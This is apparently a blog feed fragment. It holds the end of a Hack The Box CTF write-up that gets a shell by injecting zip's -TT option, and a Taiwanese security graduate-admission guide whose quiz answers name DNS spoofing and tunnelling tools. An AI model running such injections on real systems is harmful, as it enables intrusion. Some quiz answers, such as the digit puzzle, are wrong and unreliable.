1</span><br><span class="line"></span><br><span class="line">[*] Sub-directory to work <span class="keyword">in</span>: zdh6Ogvx31QCR9kWPu61pubPpr6TMIRa/Head</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Actions:</span><br><span class="line"></span><br><span class="line">1. Create artifact</span><br><span class="line">2. List directory    (<span class="built_in">pwd</span>; <span class="built_in">ls</span> -la)</span><br><span class="line">3. Compress artifact (zip &lt;name&gt;.zip &lt;name&gt; &lt;options&gt;)</span><br><span class="line">4. Change directory  (<span class="built_in">cd</span> &lt;<span class="built_in">dirname</span>&gt;)</span><br><span class="line">5. Clean directory   (<span class="built_in">rm</span> -rf ./*)</span><br><span class="line">6. Exit</span><br><span class="line"></span><br><span class="line">[*] Choose action: 1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Insert name: a</span><br><span class="line"></span><br><span class="line">Insert content: a</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[+] Artifact [a] was created successfuly!</span><br><span class="line"></span><br><span class="line">Actions:</span><br><span class="line"></span><br><span class="line">1. Create artifact</span><br><span class="line">2. List directory    (<span class="built_in">pwd</span>; <span class="built_in">ls</span> -la)</span><br><span class="line">3. Compress artifact (zip &lt;name&gt;.zip &lt;name&gt; &lt;options&gt;)</span><br><span class="line">4. Change directory  (<span class="built_in">cd</span> &lt;<span class="built_in">dirname</span>&gt;)</span><br><span class="line">5. Clean directory   (<span class="built_in">rm</span> -rf ./*)</span><br><span class="line">6. Exit</span><br><span class="line"></span><br><span class="line">[*] Choose action: 3</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Insert &lt;name&gt;.zip: a</span><br><span class="line">Insert &lt;name&gt;: a</span><br><span class="line">Insert &lt;options&gt;: -T -TT <span class="string">&#x27;sh -c /bin/sh&#x27;</span></span><br><span class="line">  adding: a (stored 0%)</span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=1000(ctf) gid=1000(ctf) <span class="built_in">groups</span>=1000(ctf)</span><br><span class="line"><span class="built_in">cat</span> ../../flag.txt</span><br><span class="line">HTB&#123;z1pp1ti_z0pp1t1_GTFO_0f_my_pr0p3rty&#125;</span><br></pre></td></tr></table></figure></div><p>這邊是利用 <code>zip</code> 的參數來開 shell：</p><ul><li>-T：zip 的 -T 參數代表「測試壓縮文件」。使用這個參數時，zip 不會進行壓縮，而是確認給定的壓縮文件的完整性。</li><li>-TT <command>：這個參數允許指定一個測試命令來進行壓縮文件的測試。然而，大部分現代 zip 工具不再支援該功能來執行自定義命令。<br>然後我們可以通過 -TT ‘sh -c &#x2F;bin&#x2F;sh’ 試圖用 sh -c &#x2F;bin&#x2F;sh 來運行一個交互式 shell。 sh -c 指定將要運行的指令，而 &#x2F;bin&#x2F;sh 則打開一個新的 shell。</li></ul><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ul><li><a class="link"   href="https://medium.com/@vs45sharma/hackthebox-compressor-challenge-b72d4c735cb" >https://medium.com/@vs45sharma/hackthebox-compressor-challenge-b72d4c735cb <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Exploitation&quot;&gt;&lt;a href=&quot;#Exploitation&quot; class=&quot;headerlink&quot; title=&quot;Exploitation&quot;&gt;&lt;/a&gt;Exploitation&lt;/h2&gt;&lt;p&gt;直接放解法：&lt;/p&gt;
&lt;div class=&quot;highlig</summary>
      
    
    
    
    
    <category term="htb" scheme="https://kazma.tw/tags/htb/"/>
    
    <category term="challenges" scheme="https://kazma.tw/tags/challenges/"/>
    
    <category term="writeup&#39;" scheme="https://kazma.tw/tags/writeup/"/>
    
    <category term="misc" scheme="https://kazma.tw/tags/misc/"/>
    
    <category term="command injection" scheme="https://kazma.tw/tags/command-injection/"/>
    
  </entry>
  
  <entry>
    <title>頂大資安研究所推甄全攻略：準備過程、技巧分享與面試心得</title>
    <link href="https://kazma.tw/2024/11/02/%E9%A0%82%E5%A4%A7%E8%B3%87%E5%AE%89%E7%A0%94%E7%A9%B6%E6%89%80%E6%8E%A8%E7%94%84%E5%85%A8%E6%94%BB%E7%95%A5%EF%BC%9A%E6%BA%96%E5%82%99%E9%81%8E%E7%A8%8B%E3%80%81%E6%8A%80%E5%B7%A7%E5%88%86%E4%BA%AB%E8%88%87%E9%9D%A2%E8%A9%A6%E5%BF%83%E5%BE%97/"/>
    <id>https://kazma.tw/2024/11/02/%E9%A0%82%E5%A4%A7%E8%B3%87%E5%AE%89%E7%A0%94%E7%A9%B6%E6%89%80%E6%8E%A8%E7%94%84%E5%85%A8%E6%94%BB%E7%95%A5%EF%BC%9A%E6%BA%96%E5%82%99%E9%81%8E%E7%A8%8B%E3%80%81%E6%8A%80%E5%B7%A7%E5%88%86%E4%BA%AB%E8%88%87%E9%9D%A2%E8%A9%A6%E5%BF%83%E5%BE%97/</id>
    <published>2024-11-02T06:22:10.711Z</published>
    <updated>2024-11-08T07:00:57.426Z</updated>
    
    <content type="html"><![CDATA[<h2 id="通用自我介紹"><a href="#通用自我介紹" class="headerlink" title="通用自我介紹"></a>通用自我介紹</h2><ul><li>五到六分鐘詳細介紹中文版：<ul><li>各位評審好，我是來自國立成功大學的葉東逸，在資安圈大家常稱呼我為 Kazma。</li><li>大學期間總共有在三個地方實習過，目前則是在奧義智慧科技擔任實習生，然後前陣子實習生成果發表了關於我基於開源的 AADInternal 工具開發了一個可以針對全台灣 Entra ID Recon 的工具，舊名是大家熟悉的 Azure AD，而這陣子在做 QNAP NAS 的漏洞挖掘，主要針對其備份 Microsoft 365 相關服務時的驗證機制和潛在漏洞。</li><li>資安競賽的部分有參加許多國內外的競賽都取得了不錯的成績，像是明天即將舉行的 HITCON CTF Final，屆時會擔任代表台灣跟其他國家的頂尖選手競爭，同時也會擔任團隊的大 PM，掌控團隊的解題狀況和進度，以及針對比賽調度人力調整策略等。另外許多國內的競賽也取得不少亮眼的成績，也因此今年被邀請擔任許多競賽的出題者，像是最近剛結束的 CGGC。</li><li>同時我也參加了不少資安社群，像是今年有受邀擔任 AIS3 的專題評審、助教、以及年初 MyFirstCTF 跟 Pre-exam 的出題者，也有參加台灣好厲駭的計畫，去年導師為 DEVCORE 執行長 Allen Own 也獲得了第八屆的表現優異獎，目前第九屆導師為交大黃俊穎教授，預計會做符號執行相關的研究。</li><li>另外我也創了了許多社群，像是去年我有成立 18 所大專院校聯合的台灣資安社群聯盟 Taiwan Security Club (TSC)，同時在曾經資安資源貧乏的南部創立了成大資安社跟新生代最強 CTF 戰隊 B33F 50UP。</li><li>其中 TSC 創立後，我們在每年寒假會舉辦全國性規模的 TSCCTF，鼓勵新手參加競賽，也針對參與的學校頒發各校前三名的獎金和獎品，成大資安社則是在成立不到一年 Discord 就超過九百人，我和夥伴們也逐漸透過社課錄製了許多課程資源和教材放在我們的 YouTube 頻道，然後 B33F 50UP 這個戰隊其實也收了許多非成大生以及高中生研究生，我們每個月都舉辦讀書會開放大家投稿同時也了解大家最近在做的研究，因次受惠的人數也不容小覷。</li><li>另外在資安領域的貢獻也讓我今年獲選了全國僅限十名的 DEVCORE 獎學金，以及受到國家資通安全研究院的邀請下學期在成大開一堂 3 學分的選修課，到時候也會擔任講師兼助教，同時我也時常被邀請到其他地方授課，像是今年暑假有受邀到元智大學擔任營隊的講師以及上個月也有到 SCIST 講課，值得一提的是，我的課程都會很用心的設計許多課程實作和回家作業，上課也會有直播跟錄影，所以我開了一個 GitHub Repository 來放置這些課程資源，不到一個月的時間也已經超過 60 顆星星了，可見有許多人也從這些教材中學到不少東西。</li><li>平時我也會參加許多資安研討會，除了參與者外，我在 HITCON、SITCON、COSCUP 也都有擔任過講者。</li></ul></li><li>五到六分鐘詳細介紹英文版：<ul><li><p>Hello, esteemed judges. My name is Dong-Yi, Ye, though in the cybersecurity community, I am often known as Kazma.</p></li><li><p>Throughout my time as an undergraduate, I’ve completed internships at three organizations and am currently interning at Cycraft. Recently, I presented a project from my internship where I developed a tool for Entra ID reconnaissance across Taiwan, based on the open-source AADInternal tool (previously known as Azure AD). Currently, I’m working on vulnerability research focused on QNAP NAS, particularly its verification mechanisms and potential vulnerabilities when backing up Microsoft 365 services.</p></li><li><p>In terms of cybersecurity competitions, I’ve participated in numerous national and international contests, achieving notable success. Tomorrow, I’ll be competing in the HITCON CTF Final, representing Taiwan against other top teams worldwide. As the team’s project manager, I’ll be responsible for monitoring our progress, adjusting strategies, and allocating resources as needed. I’ve also earned outstanding results in many domestic competitions, which has led to invitations to create challenges for various events, including the recent CGGC.</p></li><li><p>I’ve also been actively involved in the cybersecurity community. This year, I was invited to serve as a judge for AIS3, alongside being a teaching assistant and challenge creator for the MyFirstCTF and Pre-exam competitions earlier this year. I am also a participant in Taiwan’s cybersecurity program, Taiwan HolyHigh, where last year’s mentor was Allen Own, the CEO of DEVCORE. This year, I am working under Professor Chun-Ying Huang from NYCU, focusing on symbolic execution research.</p></li><li><p>Beyond participation, I’ve established several communities, including the Taiwan Security Club (TSC), which unites cybersecurity clubs from 18 universities, as well as the Cybersecurity Club at NCKU in southern Taiwan, and our CTF team, B33F 50UP, which has grown into one of the most prominent youth CTF teams.</p></li><li><p>After TSC’s foundation, we’ve hosted the national TSCCTF competition each winter, encouraging beginners to join and awarding the top three teams from each participating school with prizes and recognition. The NCKU Cybersecurity Club has gained over 900 members on Discord within its first year. My partners and I have also created and shared various educational resources on our YouTube channel. B33F 50UP has grown to include high school and graduate students from outside NCKU, and we host monthly reading sessions, inviting members to share their latest research, benefiting a significant number of participants.</p></li><li><p>My contributions in the cybersecurity field also earned me the DEVCORE National Cybersecurity Scholarship this year, a distinction awarded to only ten people nationwide. I was also invited by the National Cyber Security Institute to teach a three-credit elective course at NCKU next semester, where I’ll be serving as both the instructor and teaching assistant. I’ve also been frequently invited to teach at various institutions, such as leading a summer camp at YZU University and SCIST last month. I carefully design hands-on activities and assignments for these classes, with live streaming and recorded sessions. To share these resources widely, I created a GitHub repository, which gained over 60 stars within its first month, demonstrating its value to many learners.</p></li><li><p>I regularly attend cybersecurity conferences and have had the opportunity to speak at events like HITCON, SITCON, and COSCUP.</p></li></ul></li></ul><h2 id="交大資工所丙組"><a href="#交大資工所丙組" class="headerlink" title="交大資工所丙組"></a>交大資工所丙組</h2><h3 id="面試"><a href="#面試" class="headerlink" title="面試"></a>面試</h3><ul><li>自我介紹<ul><li>重點會想要強調實作能力，所以我的部分會主要圍繞在奧義實習開發的工具以及出題的經驗，一分鐘的客製化自我介紹大概會如下：</li><li>嗨各位評審好，我是來自國立成功大學的葉東逸，大學期間有在三個地方實習過，目前則是在奧義智慧科技實習，前陣子實習生成果發表了基於開源 AADInternal 的工具開發了一套針對全台灣上市上櫃公司的 Entra ID Recon 其中也有發現一些有趣的資訊。這陣子則是剛結束了 QNAP NAS 在備份 M365 時可能有的相關漏洞。然後在國內外也累積了不少資安競賽的成就，值得一提的是下週會代表台灣參加 HITCON CTF Final 跟其他國家的選手競爭，屆時會擔任大 PM 負責整個團隊的解題控管跟人力調度。另外這一年也預計跟著黃俊穎教授做符號執行相關的研究，另外在社群上也有許多經驗像是在 AIS3 擔任專題評審和助教以及 Pre-exam 跟 MyFirstCTF 的出題者。然後去年也創辦了台灣資安社群聯盟和成大資安社目前都擔任 leader，最近也剛獲選 DEVCORE 全國僅限十名的資安獎學金，因為在社群累積的成就和影響力，下學期也受到國家資安院邀請在成大開一堂三學分的資安選修課。</li></ul></li></ul><h3 id="性向測驗考古題"><a href="#性向測驗考古題" class="headerlink" title="性向測驗考古題"></a>性向測驗考古題</h3><p>如果有重複出現的會直接拿掉</p><h4 id="113-考古題"><a href="#113-考古題" class="headerlink" title="113 考古題"></a>113 考古題</h4><ul><li><a class="link"   href="https://www.dcard.tw/f/graduate_school/p/253728478" >https://www.dcard.tw/f/graduate_school/p/253728478 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li></ul><ol><li><p>Q: 有一個全域變數 count，且 main() 會執行兩次 inc_count() 函數。現在我們希望使用兩個執行緒（threads）來同時執行這段程式碼。請問要如何避免多執行緒操作 count 時發生競爭條件的錯誤？</p><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> Count = <span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">inc_count</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (count == <span class="number">0</span>)</span><br><span class="line">        count++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123; </span><br><span class="line">    <span class="built_in">inc_count</span>();</span><br><span class="line">    <span class="built_in">inc_count</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>A: 要避免多執行緒操作全域變數 count 時發生競爭條件問題，我們可以使用互斥鎖（mutex）來保護 count 的訪問。這樣可以確保只有一個執行緒在任意時刻修改 count，避免多執行緒造成的數據不一致問題。以下是更新後的程式碼，使用了 std::mutex 來保護 count：</p><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;thread&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;mutex&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> count = <span class="number">0</span>;</span><br><span class="line">std::mutex mtx;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">inc_count</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="function">std::lock_guard&lt;std::mutex&gt; <span class="title">lock</span><span class="params">(mtx)</span></span>;</span><br><span class="line">    <span class="keyword">if</span> (count == <span class="number">0</span>)</span><br><span class="line">        count++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123; </span><br><span class="line">    <span class="function">std::thread <span class="title">t1</span><span class="params">(inc_count)</span></span>;</span><br><span class="line">    <span class="function">std::thread <span class="title">t2</span><span class="params">(inc_count)</span></span>;</span><br><span class="line"></span><br><span class="line">    t1.<span class="built_in">join</span>();</span><br><span class="line">    t2.<span class="built_in">join</span>();</span><br><span class="line"></span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Count: &quot;</span> &lt;&lt; count &lt;&lt; std::endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li><li><p>Q: 有一個函數 f(int num)，它接受一個整數 num 作為參數，並對該數字進行一系列位元操作（左移和右移），最終返回一個整數結果。我們需要根據給定的數字 11 來執行這個函數，並計算出該數字經過位元操作後的輸出結果（包含二進位和十進位格式）。<br>A: 無法作答。</p></li><li><p>Q1: 為什麼 RAM 容量提升並未線性提高程式執行速度？<br>A1: </p><ul><li>CPU 瓶頸：若 CPU 效能限制了處理速度，增加 RAM 不會提高 CPU 的處理能力。</li><li>I&#x2F;O 瓶頸：若程式頻繁存取硬碟，存取速度受限於硬碟或 SSD 的讀寫速度。</li><li>軟體架構限制：某些程式可能無法有效利用額外的 RAM，例如單一線程程式無法利用多核心或多執行緒優勢。</li><li>作業系統的內存管理：作業系統可能未充分使用新增的 RAM，或未有效管理內存分配，導致額外 RAM 未被完全利用。</li></ul><p>Q2: 通訊軟體在傳遞訊息時，使用者端及伺服器端的完整過程？<br>A2: </p><ul><li>用戶端發送訊息：<ol><li>   輸入：用戶在應用程式中輸入訊息，按下「傳送」按鈕。</li><li>   封包處理：應用程式將訊息進行序列化，封裝成特定格式（如 JSON）。</li><li>   加密：訊息經過加密（如 TLS），確保在傳輸過程中保護資料安全。</li><li>   連接伺服器：用戶端透過網路協議（如 TCP&#x2F;IP）將訊息傳送到伺服器，資料通過網卡傳遞至網路。</li></ol></li><li>伺服器處理訊息：<ol><li>   接收請求：伺服器的網路設備接收到訊息請求。</li><li>   解密：伺服器根據加密協議（如 TLS）解密訊息，還原出用戶端傳來的內容。</li><li>   驗證身份：伺服器確認用戶身份（如 JWT 驗證），確保訊息來自合法的用戶。</li><li>   存儲：訊息儲存於伺服器的資料庫中，並將資料更新至用戶的訊息歷史中。</li><li>   通知接收端：伺服器尋找接收者的狀態，若對方在線，則發送通知；若不在線，則將訊息標記為「未讀」。</li></ol></li><li>用戶端接收訊息：<ol><li>   連接伺服器：接收方的用戶端通過網路協議連接伺服器並接收訊息。</li><li>   解密訊息：用戶端解密訊息以獲取其內容。</li><li>   顯示訊息：訊息顯示在使用者界面中，通知用戶有新的訊息。</li></ol></li></ul></li><li><p>Q: 傳送一個訊息到 LINE 或其他即時通訊軟體，中間過程為何？<br>A:</p><ol><li>   Edge-computing：訊息在靠近使用者的裝置或本地伺服器處理與儲存，快速響應但依賴裝置的運算能力。使用者的裝置透過 socket 連接伺服器，訊息透過 device I&#x2F;O 傳遞，再經過應用層、安全層等處理，快速送達對方。</li><li>   Cloud-computing：訊息經過 socket 傳至雲端伺服器處理。雲端負責所有層級的處理（包括應用層、安全層、加密等），並通過伺服器間連結轉送至接收端。此方式不依賴本地裝置，能擴展大量用戶，但受限於網路延遲。</li><li>   Hybrid：結合 edge 和 cloud，訊息的即時性需求部分在本地端處理，非即時數據在雲端存取。重要訊息先在 edge 端經 socket 連至雲端，透過 layer 處理後進行傳送，達到效率與彈性兼具的效果。</li></ol></li><li><p>Q: 設計一個面部識別解鎖系統的架構（例如用於手機或門鎖），並解釋三種軟體架構的設計情況：全部運行在裝置上（on-device）、全部運行在雲端上（cloud-based）、以及混合模式（hybrid）。另外，結合 DevOps 和 MLOps 的概念，說明這些架構如何影響開發與部署流程。<br>A: </p><ul><li>全部運行在裝置上（On-Device）<ul><li>架構：模型推理和驗證全部在裝置內完成。</li><li>優點：低延遲、即時反應、保護隱私。</li><li>挑戰：依賴裝置性能，更新模型困難。</li><li>DevOps&#x2F;MLOps：需裝置端測試與兼容性管理，模型更新較少且需手動同步。</li></ul></li><li>全部運行在雲端上（Cloud-Based）<ul><li>架構：裝置將影像傳至雲端進行處理，結果返回。</li><li>優點：裝置端負擔輕，模型隨時可更新。</li><li>挑戰：依賴網路連接，有延遲與隱私風險。</li><li>DevOps&#x2F;MLOps：快速迭代，集中部署，雲端模型易於自動化訓練與更新。</li></ul></li><li>混合模式（Hybrid）<ul><li>架構：裝置進行初步推理，需高準度時轉至雲端驗證。</li><li>優點：平衡即時性和精確性。</li><li>挑戰：需管理裝置和雲端間的協同。</li><li>DevOps&#x2F;MLOps：雙端測試，保持模型一致性，雲端更新需同步至裝置。</li></ul></li></ul></li><li><p>Q: 根據 Amdahl’s Law，有一程式的 10% 部分被加速了 90 倍，請問整體的執行速度加快多少？<br>A: <img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/1.1.png"                      alt="1.1"                ><br>貼心小提醒：<br>請準備一分鐘的自我介紹，包含：</p><ul><li>學校&#x2F;系別&#x2F;工作</li><li>你比較有興趣的領域跟得意作品等等，有給一些領域參考（程式設計、演算法、多媒體、AI、網頁、資安）</li></ul></li></ol><h4 id="112-考古題"><a href="#112-考古題" class="headerlink" title="112 考古題"></a>112 考古題</h4><ul><li><a class="link"   href="https://hackmd.io/@jotpac/HkVSK3Hps" >https://hackmd.io/@jotpac/HkVSK3Hps <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li></ul><ol><li>Q: 什麼是 Kernel？它如何運作？如何進行 debug？<br>A: Kernel 是操作系統的核心，負責管理硬體資源和與軟體的溝通，透過系統呼叫提供安全的硬體訪問。運作上，Kernel 在開機時載入並常駐內存，管理內存、處理器資源及 I&#x2F;O 等功能。debug 方法可使用 gdb 搭配 qemu 模擬、ftrace 追蹤內核事件，或用 dmesg 檢查 Kernel 日誌等方式。</li><li>   Q: 什麼是 Clang？有什麼用途？<br>  A: Clang 是一個 C、C++ 和其他編程語言的編譯器前端，基於 LLVM。Clang 具有高效的編譯速度和清晰的錯誤訊息，常用於系統軟體開發、程式分析和編譯優化。</li><li>   Q: MMIO（Memory-Mapped I&#x2F;O） 是什麼？<br>  A: MMIO 將硬體設備的 I&#x2F;O 寄存器映射到系統記憶體空間，使 CPU 透過讀寫內存地址進行設備通訊，適合需要快速訪問設備的應用場景。</li><li>   Q: Android 手機是否可以進行 IP Spoofing？如何實現？<br>  A: 是的，可以透過 root 權限來更改網絡封包的來源 IP。使用 iptables 的 mangle 表或自訂 socket 寫入自訂的 IP 地址達到 spoofing 效果，但可能違法或違反網絡政策。</li><li>   Q: 解釋 QUIC 協議，並與 TCP 和 UDP 比較。<br>  A: QUIC 是由 Google 開發的新協議，旨在解決 TCP 的連線建立延遲和 UDP 的無連接缺陷。它基於 UDP 傳輸層，實現了多路複用、低延遲和自動加密，適合低延遲和頻繁連線變更的應用場景，例如串流和即時互動。</li><li>   Q: 當收不到 ACK 時，如何確定對方裝置是關機還是網路問題？<br>  A: 可使用 ping 檢查是否能達到目標的 IP。若無回應且設備支持，通過 ARP 請求看是否有相應的 MAC 地址，或查閱路由表和 DNS 檢查網絡設置。</li><li>   Q: 如果能 ping 到 DNS 伺服器，能否透過其他方式上網？<br>  A: 是的，可以利用 DNS 隧道 將數據封裝在 DNS 查詢中傳輸，這是一種在封鎖或受限網絡中進行隧道通信的方法，例如使用 iodine 或 dnscat2。</li><li>   Q: 如何為家中的 Wi-Fi 路由器增加功能？需要哪些工具？<br>  A: 可以下載並編譯適合路由器的開源韌體（如 OpenWRT 或 DD-WRT），在開發環境下使用 C 或 shell 腳本編寫新功能。需要交叉編譯工具、串口線、韌體燒錄工具及文檔支援。</li><li>   Q: 如何利用 GPU 加速計算？<br>  A: GPU 的多核架構適合大規模並行計算，可使用 CUDA（NVIDIA）或 OpenCL 進行 GPU 加速編程，在深度學習、數據處理等應用中顯著提升運算速度。</li><li>   Q: 什麼是雲原生（Cloud Native）？<br> A: 雲原生是利用容器、微服務架構、持續交付、服務網格等工具和技術來構建和運行可擴展、彈性、動態調度的應用程序，優勢在於更快速的部署和擴展，適合現代的分散式計算環境。</li><li>   Q: 什麼是 MLOps？<br> A: MLOps 是機器學習運營的最佳實踐，結合了機器學習、DevOps 和數據工程，用於自動化模型訓練、部署和監控，確保模型在生產環境中的穩定性和可擴展性。</li></ol><h4 id="111-考古題"><a href="#111-考古題" class="headerlink" title="111 考古題"></a>111 考古題</h4><ul><li><a class="link"   href="https://hackmd.io/@bogay/111-NYCU-CS-aptitude-test" >https://hackmd.io/@bogay/111-NYCU-CS-aptitude-test <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li></ul><ol><li><p>Q: Cache -&gt; Virtual Memory -&gt; MMU -&gt; Physical Memory 關係<br>A: </p><ol><li>Cache：位於處理器內的高速記憶體，用於儲存近期存取的資料和指令。Cache 分為 L1、L2、L3 級別，依次離處理器越遠、容量越大、速度越慢。Cache 可減少 CPU 存取較慢的主記憶體 (RAM) 的次數。</li><li>   虛擬記憶體 (Virtual Memory)：虛擬記憶體使每個程式擁有其獨立的記憶體空間，透過分頁機制將主記憶體和硬碟空間結合，並提供比實體記憶體更大的可用空間。虛擬記憶體的地址 (virtual address) 由程式指定，並需要轉換為對應的實體地址。</li><li>   記憶體管理單元 (MMU)：MMU 是處理器中的硬體元件，負責將虛擬記憶體地址轉換為實體記憶體地址。MMU 通常使用分頁表 (page table) 儲存虛擬到實體地址的映射關係，並快取常用的映射資料，提升轉換效率。</li><li>   實體記憶體 (Physical Memory)：即電腦中的主記憶體或 RAM，負責儲存正在執行的資料和程式。處理器透過 MMU 來訪問實體記憶體中的資料。</li></ol><p>整體流程：<br>當 CPU 要存取記憶體地址時，它會先檢查 cache。若 cache 未命中，則 CPU 會使用虛擬地址透過 MMU 查詢對應的實體地址，並從實體記憶體中讀取資料。當記憶體不夠時，虛擬記憶體機制會將較少使用的資料從實體記憶體移至硬碟，以騰出空間。    </p></li><li><p>Q: mmap I&#x2F;O 解釋<br>A: mmap I&#x2F;O 是一種高效的文件操作方式，它將文件直接映射到程式的記憶體空間，使文件內容像在記憶體中一樣被存取。這樣可以減少系統呼叫並提高 I&#x2F;O 性能。當存取映射區域時，系統會自動從文件中載入需要的部分到記憶體。常用於處理大文件、進程間共享記憶體，或操作 I&#x2F;O 設備。</p></li><li><p>Q: AI&#x2F;ML MLOps life cycle<br>A: MLOps 是管理機器學習模型全生命周期的流程，從資料收集、模型開發、部署到監控與優化，強調自動化、版本控制及持續改進。它協助模型在實際環境中穩定高效地運行，並支持快速迭代和擴展。</p></li><li><p>Q: Cloud Native Computing 的 Major 和 Component<br>A: </p><ul><li>Cloud Native Computing 的主要核心（Major）包括：</li></ul><ol><li>   可擴展性：支援高彈性和隨需擴展，適應使用量的變化。</li><li>   彈性和容錯性：具備自我修復能力，減少故障的影響。</li><li>   敏捷開發：支援快速部署、頻繁更新，符合 CI&#x2F;CD 流程。</li></ol><ul><li>其主要組件（Components）包括：</li></ul><ol><li>   容器：例如 Docker，用於輕量化應用打包和移動。</li><li>   微服務：將應用拆分成小型、獨立的服務，易於管理和擴展。</li><li>   Kubernetes：用於容器編排，管理容器的部署和擴展。</li><li>   服務網格：例如 Istio，負責管理微服務間的通信。</li></ol></li><li><p>Q: 0.02468101214… 小數點後第 1000 位是啥數字<br>A: 這個數列的規律是依次增加 2（0、2、4、6、8、1、0、1、2、1、4），每 10 位循環一次。因為我們要找第 1000 位的數字，可以計算 1000 mod 10 &#x3D; 0，這表示第 1000 位正好在一個完整循環的結尾。<br>所以第 1000 位數字就是循環的第 10 位數字，對應的數字為 4。</p></li><li><p>Q: 100 * 99 - 98 * 97 - … + 4 * 3 - 2 * 1 &#x3D;?<br>A: 分組計算應該會發現是等差數列</p></li><li><p>Q: Clang 是啥<br>A: Clang 是一個基於 LLVM 的開源編譯器前端，主要用於 C、C++ 和 Objective-C 等語言的編譯。它的特色是編譯速度快、提供易讀的錯誤訊息、並支援模組化的編譯架構，常用於現代開發環境和工具鏈中。</p></li><li><p>Q: Syntax Directed Compile 是啥<br>A: Syntax Directed Compile 是一種在編譯過程中使用語法導向的規則進行翻譯的方法。它根據語法結構來決定如何生成程式碼，透過語法樹來執行各階段的操作，包含語法分析、語意檢查與中間碼生成，通常用於編譯器設計中來更準確地轉換原始碼至目標碼。</p></li><li><p>Q: DNS redirect attack 是啥? 怎麼在 Linux 上實作<br>A: DNS Redirect Attack 是一種攻擊方法，攻擊者透過竄改 DNS 資料，將用戶的 DNS 請求重新導向到惡意網站，目的是進行釣魚或竊取資料。攻擊方式可能包括 ARP 欺騙、DNS 偽造等。</p><p>在 Linux 上模擬這類攻擊可以使用工具，例如 dnsspoof 或 ettercap，並且設定網卡為混雜模式，然後在網路中攔截和修改 DNS 請求來達成重導效果。不過，這樣的行為會對使用者的隱私與安全造成影響，且屬於違法行為，應僅限於合法、經授權的安全測試環境。</p></li><li><p>Q: 實作過哪些 CVE<br>A: </p><ul><li>Server-Side Request Forgery (SSRF) (CVE-2023-35133)</li><li>CVE-2018-4407 (Apple XNU Kernel Integer Overflow)：<ul><li>這是 macOS 和 iOS 上的一個 kernel 缺陷，但它揭示了 IoT 和嵌入式系統中常見的整數溢位問題。<br>•展示方向：討論如何發現和利用整數溢位，並設計對應的修復方式，這種溢位漏洞在 binary exploitation 中非常普遍。</li></ul></li></ul></li><li><p>Q: buffer overflow 常見的形式<br>A: </p><ol><li>   Stack-based Overflow：當程式過多寫入資料到堆疊中的緩衝區時，可能覆蓋關鍵記憶體地址（例如返回地址），導致程式控制流被劫持。</li><li>   Heap-based Overflow：發生在堆區（heap）中，當分配的記憶體區域被溢出，影響相鄰的記憶體塊，可能導致惡意程式碼執行。</li></ol></li><li><p>Q: TCP 和 UDP 各有不好，所以 Google 推出了新的 protocol QUIC 取代 TCP ，為何?<br>A: Google 推出 QUIC 協議來取代 TCP，主要是為了解決 TCP 和 UDP 的一些缺點。QUIC 結合了 TCP 的可靠傳輸和 UDP 的低延遲特性，提供更快的連線建立速度和更好的流量控制，特別適合於現代網路應用。QUIC 支援多路徑傳輸、減少重傳延遲，並且內建加密，因此提升了傳輸速度、可靠性和安全性，特別適用於高效能的網路服務。</p></li><li><p>Q: TCP Syn 沒有回覆有 IP 沒有機器，和 IP 有機器但沒有對應的 Service，寫 socket programming 時怎麼分辨?<br>A: </p><ol><li>   連線逾時 (Timeout)：若完全沒有收到任何回應，通常表示 IP 地址上沒有機器或網路不通。</li><li>   ICMP 回應 (如 Destination Unreachable)：若收到特定的 ICMP 錯誤回應，表示 IP 存在但該埠沒有服務。這通常是 IP 有機器但該埠上沒有對應的服務。</li></ol></li><li><p>Q: wifi 可能會沒有自己想要的功能，有沒有辦法使用 c 語言在上面新增功能，列出需要的工具<br>A: </p><ol><li>   